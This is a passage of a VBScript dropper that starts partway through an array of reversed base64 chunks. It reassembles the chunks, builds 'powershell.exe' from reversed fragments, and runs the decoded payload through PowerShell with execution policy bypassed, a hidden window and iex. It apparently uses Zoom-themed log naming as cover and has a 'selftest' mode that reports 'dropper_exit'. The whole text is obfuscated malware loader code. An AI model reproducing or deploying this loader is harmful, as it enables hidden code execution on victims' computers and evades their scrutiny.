    "lh2cyV2dvBXLt92b6dCIQ1URUpjduVGJggGdhBVLul2bKhCK", _
    "oNGdhNGI9BCIgAiCpkCKn5WayR3UvRlLfRCIskyJn9GbuwGb", _
    "==QfKEDI0lGelBCIgAiC9tHI" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
        "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & b64 & "'))|iex"""

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
